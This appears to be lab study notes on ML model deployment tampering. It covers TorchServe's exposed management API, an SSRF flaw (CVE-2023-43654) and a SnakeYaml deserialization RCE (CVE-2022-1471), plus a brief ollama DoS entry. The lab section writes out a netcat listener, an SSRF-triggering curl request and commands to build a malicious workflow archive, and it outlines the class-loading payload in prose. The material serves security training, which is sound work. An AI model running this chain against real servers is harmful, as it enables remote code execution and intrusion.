# Model Deployment Tampering

Model deployment tampering attacks can occur in various stages of the ML lifecycle, particularly when models are transferred, integrated, or hosted on untrusted infrastructure. Attackers may insert backdoors, alter decision boundaries, or subtly degrade performance, often in ways that evade standard validation or testing procedures.

## Model Deployment Tampering Attacks

indirect model deployment tampering attack vector:
    Where an adversary can obtain unauthorized access to training data, which they can use to modify or poison the data used to train the model. 

## Compromising the Server Infrastructure

three different security issues:

- Misconfigured Management API enabling unauthorized remote access: A quick start guide in the official TorchServe repository exposed the management API on all interfaces, even though the documentation claims it is only accessible locally. Since no authentication was required, this enabled unauthorized remote access to the management API.
- A **Server-Side Request Forgery (SSRF)** vulnerability enables downloading remote files: The management API supports loading additional models by supplying a URL. There is no validation on the supplied URL, enabling adversaries to download manipulated model files from their servers (CVE-2023-43654).
- Usage of an insecure library containing a public deserialization vulnerability leading to remote code execution: The vulnerable TorchServer version uses a version of the Java library SnakeYaml that is vulnerable to a deserialization vulnerability (CVE-2022-1471). This vulnerability can be exploited by supplying a malicious YAML file to achieve remote code execution. For an overview of deserialization attacks, check out the Introduction to Deserialization Attacks module.

## Lab

1. Connectto the server and forward port 8000 to the lab and forward lab port 8081 to our system.

```
ssh htb-stdnt@<SERVER_IP> -p <PORT> -R 8000:127.0.0.1:8000 -L 8081:127.0.0.1:8081 -N

```
2. ensure access

```
curl http://127.0.0.1:8081/

```

3. Start netcat listener on port forwarded to the lab. 

```
nc -lnvp 8000

```

4. The vulnerable endpoint is the /workflows endpoint, which accepts a remote URL in the URL GET parameter in HTTP POST requests. Keep in mind that we can specify the URL 127.0.0.1:8000 to connect to our host system due to the SSH port forwarding. Executing the curl command, we can confirm the SSRF vulnerability as we get a hit on the netcat listener:

```
curl -X POST http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/ssrf

```

5. prepare deserialization exploit. To create such a malicious archive, we need to create two local files such that TorchServe accepts it. Firstly, we need to create a file handler.py. Secondly, we must add a specification file spec.yaml that forces the vulnerable library to load additional Java code from our system. 


    - Constructing a **java.net.URL** object pointing to the forwarded port http://127.0.0.1:8000.
    - Constructing a **java.net.URLClassLoader**object with the URL object to load an additional class from the specified URL.
    - Constructing a **javax.script.ScriptEngineManager** object from the URLClassLoader object to execute the constructor in the provided class.

6. create a war archive in expected format. 

```
pip3 install torch-workflow-archiver

torch-workflow-archiver --workflow-name pwn --spec-file spec.yaml --handler handler.py

```
The above command creates a file pwn.war containing the malicious spec.yaml and handler.py files.

## Vulnerable Framework Code


### CVE-2025-1975: Denial of Service (DoS)

**CVE-2025-1975** is a DoS vulnerability in **ollama**, a platform for running and managing LLMs locally. Ollama servers serving an LLM can be targeted by attackers to crash the server and impair its availability. The affected version ollama **0.5.11** does not properly check an array size when downloading a model from a remote server, potentially resulting in a crash if the array has an unexpected size.